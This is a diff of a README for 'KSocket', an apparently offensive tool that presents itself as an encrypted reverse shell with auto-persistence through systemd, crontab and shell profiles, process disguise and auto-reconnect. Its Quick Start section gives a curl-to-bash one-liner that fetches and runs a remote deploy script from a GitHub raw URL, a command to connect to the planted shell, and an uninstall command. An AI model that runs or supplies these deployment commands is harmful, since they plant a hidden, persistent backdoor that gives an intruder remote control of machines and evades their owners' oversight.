@@ -1,19 +1,19 @@
-# KSocket - TegalXploiter
+# KSocket
 
-Encrypted reverse shell with auto-persistence. Single file deploy, secret-key based connection
+Encrypted reverse shell with auto-persistence. Single file deploy, secret-key based connection (no IP/port needed), built from [gsocket](https://github.com/hackerschoice/gsocket) source with custom binary.
 
 ## Features
 
 - Single file deploy
-- Secret key connection
+- Secret key connection (no IP/port needed)
 - End-to-end encrypted (SRP-AES-256-CBC-SHA)
-- Auto-persistence
+- Auto-persistence (systemd, crontab, bashrc, profile, bash_profile, zshrc)
 - Process disguise
 - Auto-reconnect
 - Full interactive PTY
 - Root & non-root support
 - Zero dependency
-- Lightweight (~0% CPU)
+- Lightweight (~1-2MB RAM, ~0% CPU)
 
 ## Quick Start
 
@@ -22,22 +22,15 @@ Encrypted reverse shell with auto-persistence. Single file deploy, secret-key ba
 ```bash
 bash -c "$(curl -fsSL https://raw.githubusercontent.com/tangsel1928/ksocket/refs/heads/main/deploy)"
 ```
-```bash
-S="MySecret123" bash -c "$(curl -fsSL https://raw.githubusercontent.com/tangsel1928/ksocket/refs/heads/main/deploy)"
-```
-```bash
-bash -c "$(wget -qO- https://raw.githubusercontent.com/tangsel1928/ksocket/refs/heads/main/deploy)"
-```
-### Uninstall
 
-```bash
-curl -fsSL https://raw.githubusercontent.com/tangsel1928/ksocket/refs/heads/main/deploy | bash -s uninstall
-```
-```bash
-wget -qO- https://raw.githubusercontent.com/tangsel1928/ksocket/refs/heads/main/deploy  | bash -s uninstall
-```
 ### Connect
 
 ```bash
 ks -s "SECRET" -i
+```
+
+### Uninstall
+
+```bash
+curl -fsSL https://raw.githubusercontent.com/tangsel1928/ksocket/refs/heads/main/deploy | bash -s uninstall
 ```
